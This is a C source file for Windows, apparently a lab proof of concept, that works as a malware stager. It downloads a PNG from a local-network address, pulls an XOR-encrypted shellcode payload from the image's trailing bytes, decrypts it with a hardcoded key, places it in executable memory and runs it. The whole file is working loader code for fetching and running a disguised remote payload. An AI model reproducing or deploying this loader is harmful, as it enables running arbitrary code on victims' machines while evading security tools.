#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

void xorDecrypt(unsigned char* data, size_t len, const char* key) {
    size_t keyLen = strlen(key);
    for (size_t i = 0; i < len; ++i) {
        data[i] ^= key[i % keyLen];
    }
}

unsigned char* DownloadFromURL(const char* url, DWORD* pBytesRead) {
    HINTERNET hInternet = NULL;
    HINTERNET hUrl = NULL;
    unsigned char* buffer = NULL;
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    DWORD bufferSize = 4096;
    DWORD contentLength = 0;

    *pBytesRead = 0;
    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    hUrl = InternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);


    DWORD headerLen = sizeof(contentLength);
    HttpQueryInfoA(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
        &contentLength, &headerLen, NULL);

    buffer = (unsigned char*)malloc(bufferSize);

    while (InternetReadFile(hUrl, buffer + totalBytesRead, bufferSize - totalBytesRead, &bytesRead)) {
        if (bytesRead == 0) {
            break;
        }

        totalBytesRead += bytesRead;

        if (totalBytesRead >= bufferSize) {
            bufferSize *= 2;
            unsigned char* newBuffer = (unsigned char*)realloc(buffer, bufferSize);
            buffer = newBuffer;
        }
    }

    if (bytesRead == 0 && GetLastError() == 0) {
        *pBytesRead = totalBytesRead;
    }

    if (hUrl) InternetCloseHandle(hUrl);
    if (hInternet) InternetCloseHandle(hInternet);

    return buffer;
}

unsigned char* ExtractShellcodeFromPNG(unsigned char* pngData, DWORD pngSize,
    size_t shellcodeLen, DWORD* extractedLen) {

    unsigned char* shellcode = (unsigned char*)malloc(shellcodeLen);

    memcpy(shellcode, pngData + (pngSize - shellcodeLen), shellcodeLen);
    *extractedLen = shellcodeLen;

    return shellcode;
}

int main() {
    const char* url = "http://192.168.2.131:8000/calc.png";
    const char* key = "Thisisaxorkey";
    const size_t shellcode_len = 276;

    DWORD totalBytesRead = 0;
    DWORD extractedLen = 0;

    unsigned char* downloadedData = DownloadFromURL(url, &totalBytesRead);

    unsigned char* encrypted = ExtractShellcodeFromPNG(downloadedData, totalBytesRead,
        shellcode_len, &extractedLen);

    unsigned char* buf1 = (unsigned char*)malloc(shellcode_len);

    memcpy(buf1, encrypted, shellcode_len);
    xorDecrypt(buf1, shellcode_len, key);

    void* exec = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buf1, shellcode_len);

    FlushInstructionCache(GetCurrentProcess(), exec, shellcode_len);
   ((void(*)())exec)();
    return 0;
}